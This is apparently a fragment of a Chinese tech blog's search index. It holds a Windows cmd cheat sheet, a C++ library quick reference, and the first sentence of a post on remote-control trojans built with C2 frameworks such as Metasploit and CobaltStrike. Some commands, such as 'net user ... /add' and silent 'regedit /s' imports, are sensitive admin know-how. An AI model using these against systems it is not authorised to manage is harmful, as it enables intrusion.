\u6216 <code>mkdir new_directory</code> <code>cd</code> / <code>chdir</code> \u8fdb\u5165\u76ee\u5f55\uff0c\u4f8b\u5982 <code>cd C:\\Windows</code>\uff0c\u4f7f\u7528\u76f8\u5bf9\u6216\u7edd\u5bf9\u8def\u5f84 <code>rd</code> / <code>rmdir</code> \u5220\u9664\u76ee\u5f55\uff0c\u4f8b\u5982 <code>rd /s /q directory</code>\uff0c<code>/s</code> \u5220\u9664\u76ee\u5f55\u53ca\u5176\u4e0b\u6240\u6709\u5185\u5bb9\uff0c<code>/q</code> \u4e0d\u786e\u8ba4","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_16","title":"\u6587\u4ef6\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>del</code> \u5220\u9664\u6587\u4ef6\uff0c\u4f8b\u5982 <code>del file.txt</code>\uff0c<code>/f</code> \u5f3a\u5236\u5220\u9664\u53ea\u8bfb\u6587\u4ef6\uff0c<code>/s</code> \u5220\u9664\u76ee\u5f55\u53ca\u5176\u4e0b\u6240\u6709\u5185\u5bb9\uff0c<code>/q</code> \u4e0d\u786e\u8ba4 <code>copy</code> \u590d\u5236\u6587\u4ef6\uff0c\u4f8b\u5982 <code>copy source_file destination_file</code> <code>attrib</code> \u4fee\u6539\u6587\u4ef6\u5c5e\u6027\uff0c\u4f8b\u5982 <code>attrib +h file.txt</code> \u8bbe\u4e3a\u9690\u85cf\u5c5e\u6027 <code>move</code> \u79fb\u52a8\u6587\u4ef6\uff0c\u4f8b\u5982 <code>move source_file destination_file</code> <code>fc</code> \u6bd4\u8f83\u4e24\u4e2a\u6587\u4ef6\u5e76\u8f93\u51fa\u5dee\u5f02\uff0c\u4f8b\u5982 <code>fc file1.txt file2.txt &gt; differences.txt</code>","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_17","title":"\u5185\u5b58\u64cd\u4f5c","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>debug</code> \u8c03\u8bd5\u5185\u5b58\uff0c\u4f8b\u5982 <code>debug</code>\uff0c<code>-w file.bin</code> \u5199\u5165\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c<code>-o address1 address2</code> \u8f93\u51fa\u5185\u5b58\uff0c<code>-q</code> \u9000\u51fa","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_18","title":"\u7f51\u7edc\u4e0e\u8fde\u63a5","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>net use</code> \u7ba1\u7406\u7f51\u7edc\u8fde\u63a5\uff0c\u4f8b\u5982 <code>net use h: \\\\server\\share</code> \u6620\u5c04\u7f51\u7edc\u9a71\u52a8\u5668\uff0c<code>/del</code> \u5220\u9664\u6620\u5c04 <code>net user</code> \u7ba1\u7406\u7528\u6237\u8d26\u6237\uff0c\u4f8b\u5982 <code>net user username password /add</code> \u521b\u5efa\u7528\u6237 <code>net start</code> \u542f\u52a8\u670d\u52a1\uff0c\u4f8b\u5982 <code>net start telnet</code> <code>net stop</code> \u505c\u6b62\u670d\u52a1\uff0c\u4f8b\u5982 <code>net stop telnet</code> <code>net view</code> \u67e5\u770b\u5c40\u57df\u7f51\u5185\u7684\u5171\u4eab\uff0c\u4f8b\u5982 <code>net view</code> <code>ping</code> \u68c0\u67e5\u7f51\u7edc\u8fde\u63a5\uff0c\u4f8b\u5982 <code>ping 192.168.1.1</code> <code>tracert</code> \u8ddf\u8e2a\u6570\u636e\u5305\u8def\u7531\uff0c\u4f8b\u5982 <code>tracert 192.168.1.1</code> <code>nbtstat</code> \u67e5\u770b NetBIOS \u72b6\u6001\uff0c\u4f8b\u5982 <code>nbtstat -A 192.168.1.1</code> <code>arp</code> \u67e5\u770b\u548c\u5904\u7406 ARP \u7f13\u5b58\uff0c\u4f8b\u5982 <code>arp -a</code> <code>route print</code> \u663e\u793a IP \u8def\u7531\u8868\uff0c\u4f8b\u5982 <code>route print</code> <code>ipconfig</code> \u67e5\u770b\u672c\u5730 IP \u5730\u5740\uff0c\u4f8b\u5982 <code>ipconfig /all</code> <code>netsh</code> \u67e5\u770b\u6216\u66f4\u6539\u672c\u5730\u7f51\u7edc\u914d\u7f6e\uff0c\u4f8b\u5982 <code>netsh interface ip show config</code> <code>telnet</code> \u8fdc\u7a0b\u767b\u5f55\u670d\u52a1\u5668\uff0c\u4f8b\u5982 <code>telnet 192.168.1.1 23</code> <code>tlist</code> \u4ee5\u6811\u5f62\u7ed3\u6784\u663e\u793a\u8fdb\u7a0b\uff0c\u4f8b\u5982 <code>tlist -t</code> <code>kill</code> \u5f3a\u5236\u7ed3\u675f\u8fdb\u7a0b\uff0c\u4f8b\u5982 <code>kill -F process_name</code>","tags":["Windows\u547d\u4ee4"]},{"location":"program/2024-08-17-cmd%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_19","title":"\u7cfb\u7edf\u5de5\u5177\u4e0e\u8bca\u65ad","text":"\u547d\u4ee4 \u63cf\u8ff0 <code>taskmgr</code> \u6253\u5f00\u4efb\u52a1\u7ba1\u7406\u5668 <code>regedit</code> \u6253\u5f00\u6ce8\u518c\u8868\u7f16\u8f91\u5668\uff0c\u4f8b\u5982 <code>regedit /s filename.reg</code> \u5176\u4e2d <code>/s</code> \u4e3a\u5b89\u9759\u6a21\u5f0f\u5bfc\u5165\uff0c\u65e0\u4efb\u4f55\u63d0\u793a <code>sfc /scannow</code> \u626b\u63cf\u5e76\u4fee\u590d\u7cfb\u7edf\u6587\u4ef6 <code>sigverif</code> \u6587\u4ef6\u7b7e\u540d\u9a8c\u8bc1 <code>mspaint</code> \u6253\u5f00\u753b\u56fe\u677f <code>magnify</code> \u6253\u5f00\u653e\u5927\u955c\u5b9e\u7528\u7a0b\u5e8f <code>mem</code> \u663e\u793a\u5185\u5b58\u4f7f\u7528\u60c5\u51b5 <code>winmsd</code> \u663e\u793a\u7cfb\u7edf\u4fe1\u606f <code>eudcedit</code> \u6253\u5f00\u9020\u5b57\u7a0b\u5e8f <code>exit</code> \u9000\u51fa CMD \u6216\u6279\u5904\u7406\u811a\u672c\uff0c\u4f8b\u5982 <code>exit /b</code> \u9000\u51fa\u5f53\u524d\u6279\u5904\u7406\u811a\u672c <code>path</code> \u8bbe\u7f6e\u53ef\u6267\u884c\u6587\u4ef6\u8def\u5f84\uff0c\u4f8b\u5982 `path %path%;C:\\new","tags":["Windows\u547d\u4ee4"]},{"location":"security/2024-04-22-CTF/","title":"C++\u57fa\u7840","text":"<p>\uff08\u5f85\u5b8c\u5584\uff09</p>","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#ip","title":"\u4e00\u3001ip\u5730\u5740\u8be6\u89e3","text":"<p>sizeof\uff08\u6570\u636e\u7c7b\u578b\uff09\u53ef\u8fd4\u56de\u5b57\u8282\u957f</p> <p></p> \u6570\u636e\u7c7b\u578b \u5927\u5c0f\uff08\u5b57\u8282\uff09 \u8303\u56f4 <code>bool</code> 1 <code>true</code> \u6216 <code>false</code> <code>char</code> 1 -128 \u5230 127 \u6216 0 \u5230 255 <code>signed char</code> 1 -128 \u5230 127 <code>unsigned char</code> 1 0 \u5230 255 <code>short</code> 2 -32,768 \u5230 32,767 <code>unsigned short</code> 2 0 \u5230 65,535 <code>int</code> 4 -2,147,483,648 \u5230 2,147,483,647 <code>unsigned int</code> 4 0 \u5230 4,294,967,295 <code>long</code> 4 \u6216 8 -2,147,483,648 \u5230 2,147,483,647 \u6216\u66f4\u5927 <code>unsigned long</code> 4 \u6216 8 0 \u5230 4,294,967,295 \u6216\u66f4\u5927 <code>long long</code> 8 -(2^63) \u5230 (2^63)-1 <code>unsigned long long</code> 8 0 \u5230 (2^64)-1 <code>float</code> 4 \u5355\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 7 \u4f4d\u6709\u6548\u6570\u5b57 <code>double</code> 8 \u53cc\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 15 \u4f4d\u6709\u6548\u6570\u5b57 <code>long double</code> 8 \u6216 12 \u6216 16 \u6269\u5c55\u7cbe\u5ea6\u6d6e\u70b9\u6570\uff0c\u901a\u5e38\u4e3a 19 \u4f4d\u6709\u6548\u6570\u5b57 <code>void</code> \u7a7a\u7c7b\u578b\uff0c\u901a\u5e38\u7528\u4e8e\u51fd\u6570\u4e0d\u8fd4\u56de\u503c\u7684\u60c5\u51b5 <code>wchar_t</code> 2 \u6216 4 \u53d6\u51b3\u4e8e\u7f16\u8bd1\u5668\u548c\u5e73\u53f0\uff0c\u901a\u5e38\u7528\u4e8e\u5bbd\u5b57\u7b26\u8868\u793a\u6cd5","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#includeiomanip","title":"\u4e8c\u3001include<code>&lt;iomanip&gt;</code>","text":"","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#1","title":"1\u3001\u5e03\u5c14\u6807\u5fd7\u548c\u6570\u5b57\u683c\u5f0f\u5316","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>boolalpha</code> \u5c06\u5e03\u5c14\u503c\u8f93\u51fa\u4e3a <code>true</code> \u6216 <code>false</code> \u800c\u4e0d\u662f <code>1</code> \u6216 <code>0</code>\u3002 <code>noboolalpha</code> \u53d6\u6d88 <code>boolalpha</code> \u7684\u6548\u679c\u3002 <code>showbase</code> \u5728\u8f93\u51fa\u6574\u6570\u65f6\u663e\u793a\u57fa\u6570\uff08\u5982\u5341\u516d\u8fdb\u5236\u524d\u7f00 <code>0x</code>\uff09\u3002 <code>noshowbase</code> \u53d6\u6d88 <code>showbase</code> \u7684\u6548\u679c\u3002 <code>showpoint</code> \u5f3a\u5236\u8f93\u51fa\u6d6e\u70b9\u6570\u7684\u5c0f\u6570\u70b9\u548c\u5c3e\u968f\u7684\u96f6\u3002 <code>noshowpoint</code> \u53d6\u6d88 <code>showpoint</code> \u7684\u6548\u679c\u3002 <code>showpos</code> \u5728\u6b63\u6570\u524d\u663e\u793a\u52a0\u53f7\u3002 <code>noshowpos</code> \u53d6\u6d88 <code>showpos</code> \u7684\u6548\u679c\u3002","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#2","title":"2\u3001\u8f93\u51fa\u6d41\u63a7\u5236","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>setw(int n)</code> \u8bbe\u7f6e\u5b57\u6bb5\u5bbd\u5ea6\u4e3a <code>n</code>\u3002 <code>setprecision(int n)</code> \u8bbe\u7f6e\u6d6e\u70b9\u6570\u7cbe\u5ea6\u4e3a <code>n</code>\u3002 <code>setfill(char c)</code> \u8bbe\u7f6e\u586b\u5145\u5b57\u7b26\u4e3a <code>c</code>\u3002 <code>left</code> \u5de6\u5bf9\u9f50\u8f93\u51fa\u3002 <code>right</code> \u53f3\u5bf9\u9f50\u8f93\u51fa\u3002 <code>internal</code> \u5728\u7b26\u53f7\u548c\u6570\u503c\u4e4b\u95f4\u586b\u5145\u7b26\u53f7\u3002 <code>fixed</code> \u4ee5\u56fa\u5b9a\u70b9\u683c\u5f0f\u8f93\u51fa\u6d6e\u70b9\u6570\u3002 <code>scientific</code> \u4ee5\u79d1\u5b66\u8bb0\u6570\u6cd5\u8f93\u51fa\u6d6e\u70b9\u6570\u3002 <code>hex</code> \u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u3002 <code>oct</code> \u4ee5\u516b\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u3002 <code>dec</code> \u4ee5\u5341\u8fdb\u5236\u683c\u5f0f\u8f93\u51fa\u6574\u6570\u3002 <code>setiosflags(flag)</code> \u8bbe\u7f6e\u6d41\u6807\u5fd7\u3002 <code>resetiosflags(flag)</code> \u91cd\u7f6e\u6d41\u6807\u5fd7\u3002 <code>setbase(base)</code> \u8bbe\u7f6e\u6574\u6570\u8f93\u51fa\u7684\u57fa\u6570\u3002 <code>setfill(c)</code> \u8bbe\u7f6e\u586b\u5145\u5b57\u7b26\u3002 <code>flush</code> \u5237\u65b0\u8f93\u51fa\u6d41\u3002","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#3","title":"3\u3001\u8f93\u5165\u6d41\u63a7\u5236","text":"\u64cd\u4f5c\u65b9\u6cd5 \u63cf\u8ff0 <code>skipws</code> \u8df3\u8fc7\u8f93\u5165\u65f6\u7684\u7a7a\u767d\u5b57\u7b26\u3002 <code>noskipws</code> \u53d6\u6d88 <code>skipws</code> \u7684\u6548\u679c\u3002","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#includecmath","title":"\u4e09\u3001include<code>&lt;cmath&gt;</code>","text":"\u51fd\u6570\u539f\u578b \u63cf\u8ff0 <code>double sin(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u6b63\u5f26\u503c\u3002 <code>double cos(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u4f59\u5f26\u503c\u3002 <code>double tan(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u6b63\u5207\u503c\u3002 <code>double asin(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u6b63\u5f26\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double acos(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u4f59\u5f26\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double atan(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u53cd\u6b63\u5207\u503c\uff08\u5f27\u5ea6\uff09\u3002 <code>double exp(double x);</code> \u8ba1\u7b97 <code>e</code> \u7684 <code>x</code> \u6b21\u5e42\u3002 <code>double log(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u81ea\u7136\u5bf9\u6570\uff08\u4ee5 <code>e</code> \u4e3a\u5e95\uff09\u3002 <code>double log10(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u5e38\u7528\u5bf9\u6570\uff08\u4ee5 <code>10</code> \u4e3a\u5e95\uff09\u3002 <code>double log2(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u4e8c\u8fdb\u5236\u5bf9\u6570\uff08\u4ee5 <code>2</code> \u4e3a\u5e95\uff09\u3002 <code>double pow(double x, double y);</code> \u8ba1\u7b97 <code>x</code> \u7684 <code>y</code> \u6b21\u5e42\u3002 <code>double sqrt(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u5e73\u65b9\u6839\u3002 <code>double cbrt(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7acb\u65b9\u6839\u3002 <code>double ceil(double x);</code> \u5411\u4e0a\u53d6\u6574\uff0c\u8fd4\u56de\u4e0d\u5c0f\u4e8e <code>x</code> \u7684\u6700\u5c0f\u6574\u6570\u3002 <code>double floor(double x);</code> \u5411\u4e0b\u53d6\u6574\uff0c\u8fd4\u56de\u4e0d\u5927\u4e8e <code>x</code> \u7684\u6700\u5927\u6574\u6570\u3002 <code>double round(double x);</code> \u56db\u820d\u4e94\u5165\uff0c\u8fd4\u56de\u6700\u63a5\u8fd1\u7684\u6574\u6570\u503c\u3002 <code>int abs(int x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7edd\u5bf9\u503c\u3002 <code>double fabs(double x);</code> \u8ba1\u7b97 <code>x</code> \u7684\u7edd\u5bf9\u503c\uff08\u9002\u7528\u4e8e\u6d6e\u70b9\u6570\uff09\u3002 <code>double max(double x, double y);</code> \u8fd4\u56de <code>x</code> \u548c <code>y</code> \u4e2d\u7684\u6700\u5927\u503c\u3002 <code>double min(double x, double y);</code> \u8fd4\u56de <code>x</code> \u548c <code>y</code> \u4e2d\u7684\u6700\u5c0f\u503c\u3002","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#_1","title":"\u56db\u3001\u6570\u7ec4","text":"<p>\u6570\u7ec4\u4f5c\u4e3a\u53c2\u6570\u65f6\uff0c\u5b9e\u9645\u662f\u4e00\u79cd\u6307\u9488\u7c7b\u578b</p> \u64cd\u4f5c \u63cf\u8ff0 vector a;vector&gt; vec(rows, vector(columns)); \u521b\u5efa\u4e00\u7ef4\u5411\u91cf\u548c\u4e8c\u7ef4\u5411\u91cf\u3002 push_back(num) \u5411\u5411\u91cf\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u65b0\u5143\u7d20\u3002 pop_back(num) \u5220\u9664\u5411\u91cf\u672b\u5c3e\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 insert(index,num) \u5728\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u4e00\u4e2a\u65b0\u5143\u7d20\u3002 erase(index) \u5220\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u5143\u7d20\u3002 clear() \u6e05\u7a7a\u5411\u91cf\u4e2d\u7684\u6240\u6709\u5143\u7d20\u3002 resize(n) \u6539\u53d8\u5411\u91cf\u7684\u5927\u5c0f\u3002 size() \u8fd4\u56de\u5411\u91cf\u4e2d\u5143\u7d20\u7684\u6570\u91cf\u3002 empty() \u68c0\u67e5\u5411\u91cf\u662f\u5426\u4e3a\u7a7a,\u7a7a\u5219\u8fd4\u56de1\u3002 front() \u8fd4\u56de\u5411\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u3002 back() \u8fd4\u56de\u5411\u91cf\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u3002 begin() \u8fd4\u56de\u5411\u91cf\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002 end() \u8fd4\u56de\u5411\u91cf\u7684\u6700\u540e\u4e00\u4e2a\u5143\u7d20\u7684\u8fed\u4ee3\u5668\u3002 at() \u8bbf\u95ee\u6307\u5b9a\u4f4d\u7f6e\u7684\u5143\u7d20\u3002 swap() \u4ea4\u6362\u4e24\u4e2a\u5411\u91cf\u7684\u5185\u5bb9\u3002eg:vector1.swap(vector2)","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#includecstring","title":"\u4e94\u3001include<code>&lt;cstring&gt;</code>","text":"\u64cd\u4f5c \u51fd\u6570/\u63cf\u8ff0 \u793a\u4f8b \u957f\u5ea6\u8ba1\u7b97 <code>strlen(str)</code>\uff1a\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u4e0d\u5305\u62ec\u672b\u5c3e\u7684\u7a7a\u5b57\u7b26 <code>\\0</code>\u3002 <code>size_t len = strlen(\"Hello\");</code> \u590d\u5236 <code>strcpy(dest, src)</code>\uff1a\u5c06 <code>src</code> \u590d\u5236\u5230 <code>dest</code>\uff0c\u76ee\u6807\u6570\u7ec4\u5fc5\u987b\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u3002 <code>char dest[10]; strcpy(dest, \"Hello\");</code> \u5b89\u5168\u590d\u5236 <code>strncpy(dest, src, count)</code>\uff1a\u590d\u5236 <code>count</code> \u4e2a\u5b57\u7b26\uff0c\u786e\u4fdd\u76ee\u6807\u6570\u7ec4\u8db3\u591f\u5927\uff0c\u4e14\u53ef\u80fd\u9700\u8981\u624b\u52a8\u6dfb\u52a0 <code>\\0</code>\u3002 <code>char dest[10]; strncpy(dest, \"Hello\", 10); dest[9] = '\\0';</code> \u8fde\u63a5 <code>strcat(dest, src)</code>\uff1a\u5c06 <code>src</code> \u8fde\u63a5\u5230 <code>dest</code> \u672b\u5c3e\uff0c\u786e\u4fdd\u76ee\u6807\u6570\u7ec4\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u3002 <code>char dest[20] = \"Hello \"; strcat(dest, \"World!\");</code> \u5b89\u5168\u8fde\u63a5 <code>strncat(dest, src, count)</code>\uff1a\u8fde\u63a5 <code>count</code> \u4e2a\u5b57\u7b26\uff0c\u786e\u4fdd\u76ee\u6807\u6570\u7ec4\u8db3\u591f\u5927\uff0c\u4e14\u53ef\u80fd\u9700\u8981\u624b\u52a8\u6dfb\u52a0 <code>\\0</code>\u3002 <code>char dest[20] = \"Hello \"; strncat(dest, \"World!\", 6);</code> \u6bd4\u8f83 <code>strcmp(str1, str2)</code>\uff1a\u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u8d1f\u503c\u30010 \u6216\u6b63\u503c\uff0c\u8868\u793a str1 \u5c0f\u4e8e\u3001\u7b49\u4e8e\u6216\u5927\u4e8e str2\u3002 <code>int cmp = strcmp(\"abc\", \"abcd\"); // \u8fd4\u56de\u8d1f\u503c</code> \u5b50\u5b57\u7b26\u4e32 <code>strstr(haystack, needle)</code>\uff1a\u5728 <code>haystack</code> \u4e2d\u67e5\u627e <code>needle</code> \u5b50\u5b57\u7b26\u4e32\uff0c\u8fd4\u56de\u6307\u5411\u9996\u6b21\u5339\u914d\u7684\u6307\u9488\u3002 <code>char* sub = strstr(\"Hello World\", \"World\"); // \u6307\u5411 \"World\"</code> \u67e5\u627e\u5b57\u7b26 <code>strchr(str, c)</code>\uff1a\u67e5\u627e <code>str</code> \u4e2d\u7b2c\u4e00\u4e2a <code>c</code> \u7684\u4f4d\u7f6e\uff1b<code>strrchr(str, c)</code>\uff1a\u67e5\u627e\u6700\u540e\u4e00\u4e2a <code>c</code> \u7684\u4f4d\u7f6e\u3002 <code>char* first = strchr(\"Hello\", 'l'); char* last = strrchr(\"Hello\", 'l');</code> \u5206\u5272 <code>strtok(str, delimiters)</code>\uff1a\u62c6\u5206\u5b57\u7b26\u4e32\uff0c\u4ee5 <code>delimiters</code> \u4f5c\u4e3a\u5206\u9694\u7b26\u3002 <code>char str[] = \"Hello,World!\"; char* token = strtok(str, \",!\"); // \u7b2c\u4e00\u4e2a token \"Hello\"</code> \u8f6c\u6362\u6574\u578b <code>atoi(str)</code>\uff1a\u5c06 C \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6574\u578b\u3002 <code>int num = atoi(\"123\");</code> \u8f6c\u6362\u6d6e\u70b9 <code>atof(str)</code>\uff1a\u5c06 C \u5b57\u7b26\u4e32\u8f6c\u6362\u4e3a\u6d6e\u70b9\u578b\u3002 <code>double val = atof(\"12.34\");</code> \u51fd\u6570 \u63cf\u8ff0 <code>strlen(str)</code> \u8fd4\u56de\u5b57\u7b26\u4e32 <code>str</code> \u7684\u957f\u5ea6\uff0c\u4e0d\u5305\u62ec\u672b\u5c3e\u7684\u7a7a\u5b57\u7b26\uff08<code>\\0</code>\uff09\u3002 <code>strcpy_s(des, src)</code><code>strcpy_s(des, desSize, src)</code> \u5c06\u5b57\u7b26\u4e32 <code>src</code> \u590d\u5236\u5230 <code>des</code>\uff0c\u9700\u8981\u786e\u4fdd <code>des</code> \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u3002\u7b2c\u4e8c\u4e2a\u7248\u672c\u5305\u62ec <code>desSize</code> \u4ee5\u9632\u6b62\u7f13\u51b2\u533a\u6ea2\u51fa\u3002 <code>strcat_s(des, desSize, src)</code><code>strncat_s(des, desSize, src, count)</code> \u5c06\u5b57\u7b26\u4e32 <code>src</code> \u8fde\u63a5\u5230 <code>des</code> \u7684\u672b\u5c3e\u3002<code>strcat_s</code> \u8981\u6c42 <code>des</code> \u6709\u8db3\u591f\u7684\u7a7a\u95f4\u5e76\u63d0\u4f9b <code>desSize</code>\uff0c<code>strncat_s</code> \u5219\u9650\u5236\u8fde\u63a5\u7684\u6700\u5927\u5b57\u7b26\u6570\uff08<code>count</code>\uff09\u3002 <code>strcmp(str1, str2)</code><code>strncmp(str1, str2, n)</code> \u6bd4\u8f83\u4e24\u4e2a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u5b83\u4eec\u76f8\u7b49\uff0c\u8fd4\u56de0\uff1b\u5982\u679c <code>str1</code> \u5c0f\u4e8e <code>str2</code>\uff0c\u8fd4\u56de\u8d1f\u503c\uff1b\u5982\u679c <code>str1</code> \u5927\u4e8e <code>str2</code>\uff0c\u8fd4\u56de\u6b63\u503c\u3002<code>strncmp</code> \u53ea\u6bd4\u8f83\u524d <code>n</code> \u4e2a\u5b57\u7b26\u3002 <code>strchr(str, c)</code> \u67e5\u627e\u5b57\u7b26\u4e32 <code>str</code> \u4e2d\u9996\u6b21\u51fa\u73b0\u5b57\u7b26 <code>c</code> \u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u8be5\u5b57\u7b26\u7684\u6307\u9488\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u5219\u8fd4\u56de <code>NULL</code>\u3002 <code>strrchr(str, c)</code> \u67e5\u627e\u5b57\u7b26\u4e32 <code>str</code> \u4e2d\u6700\u540e\u4e00\u6b21\u51fa\u73b0\u5b57\u7b26 <code>c</code> \u7684\u4f4d\u7f6e\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u8be5\u5b57\u7b26\u7684\u6307\u9488\u3002 <code>strstr(haystack, needle)</code> \u5728\u5b57\u7b26\u4e32 <code>haystack</code> \u4e2d\u67e5\u627e\u5b50\u5b57\u7b26\u4e32 <code>needle</code>\uff0c\u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u9996\u6b21\u5339\u914d\u4f4d\u7f6e\u7684\u6307\u9488\u3002\u5982\u679c\u627e\u4e0d\u5230\uff0c\u8fd4\u56de <code>NULL</code>\u3002 <code>strtok_s(str, delimiters, &amp;context)</code> \u7528\u6307\u5b9a\u7684\u5206\u9694\u7b26\u62c6\u5206\u5b57\u7b26\u4e32\u3002<code>context</code> \u662f\u4e00\u4e2a\u6307\u5411\u4fdd\u5b58\u72b6\u6001\u7684\u6307\u9488\u3002 <code>memcpy(dest, src, count)</code> \u5c06 <code>count</code> \u5b57\u8282\u4ece\u6e90 <code>src</code> \u590d\u5236\u5230\u76ee\u6807 <code>dest</code>\u3002 <code>memmove(dest, src, count)</code> \u4e0e <code>memcpy</code> \u7c7b\u4f3c\uff0c\u4f46\u652f\u6301\u6e90\u548c\u76ee\u6807\u533a\u57df\u91cd\u53e0\u3002 <code>memset(s, c, count)</code> \u7528\u5b57\u7b26 <code>c</code> \u586b\u5145 <code>s</code> \u7684\u524d <code>count</code> \u5b57\u8282\u3002 <code>memcmp(s1, s2, count)</code> \u6bd4\u8f83\u4e24\u4e2a\u5185\u5b58\u5757\u7684\u524d <code>count</code> \u5b57\u8282\uff0c\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u6765\u6307\u793a\u5b83\u4eec\u7684\u76f8\u5bf9\u987a\u5e8f\u3002","tags":["C++\u901f\u67e5"]},{"location":"security/2024-04-22-CTF/#includestring","title":"\u516d\u3001include<code>&lt;string&gt;</code>          coolzest","text":"\u64cd\u4f5c \u63cf\u8ff0 <code>length()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u3002 <code>size()</code> \u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u5927\u5c0f\uff08\u4e0e\u957f\u5ea6\u76f8\u540c\uff09\u3002 <code>empty()</code> \u68c0\u67e5\u5b57\u7b26\u4e32\u662f\u5426\u4e3a\u7a7a\u3002 <code>clear()</code> \u6e05\u7a7a\u5b57\u7b26\u4e32\u5185\u5bb9\u3002 <code>append(\"string\")</code> \u5728\u5b57\u7b26\u4e32\u672b\u5c3e\u8ffd\u52a0\u5176\u4ed6\u5b57\u7b26\u4e32\u3002 <code>substr(index1,index2)</code> \u8fd4\u56de\u5b50\u5b57\u7b26\u4e32\u3002 <code>find(\"string\")</code> \u5728\u5b57\u7b26\u4e32\u4e2d\u67e5\u627e\u5b50\u5b57\u7b26\u4e32\u7684\u7b2c\u4e00\u6b21\u51fa\u73b0\u4f4d\u7f6e\u3002 <code>replace(index1(,index2,)\"string\")</code> \u66ff\u6362\u5b57\u7b26\u4e32\u4e2d\u7684\u5b50\u5b57\u7b26\u4e32\u3002 <code>erase(index) or erase(index1,index2)</code> \u4ece\u5b57\u7b26\u4e32\u4e2d\u5220\u9664\u6307\u5b9a\u4f4d\u7f6e\u7684\u5b57\u7b26\u6216\u4e00\u6bb5\u5b57\u7b26\u3002 <code>insert(index) or insert</code>(index1,index2) \u5728\u6307\u5b9a\u4f4d\u7f6e\u63d2\u5165\u5176\u4ed6\u5b57\u7b26\u4e32\u6216\u5b57\u7b26\u3002 <code>+</code> \u5c06\u4e24\u4e2a\u5b57\u7b26\u4e32\u8fde\u63a5\u8d77\u6765\u3002 <code>=</code> \u5c06\u4e00\u4e2a\u5b57\u7b26\u4e32\u8d4b\u503c\u7ed9\u53e6\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002 <p>regards.</p>","tags":["C++\u901f\u67e5"]},{"location":"security/2024-08-17-%E8%BF%9C%E6%8E%A7%E6%9C%A8%E9%A9%AC/","title":"\u8fdc\u63a7\u6728\u9a6c","text":"<p>\u8fdc\u7a0b\u63a7\u5236\u6728\u9a6c\u88ab\u7ea2\u961f\u5e7f\u6cdb\u4f7f\u7528\uff0c\u4e00\u822c\u662f\u7531 Metasploit\u3001CobaltStrike \u7b49 C2 \u63a7\u5236\u5668\u751f\u6210\u7684\u7cfb\u7edf\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5982 exe\u3001elf\u3001apk\u3001macho \u6587\u4ef6\u3002</p> 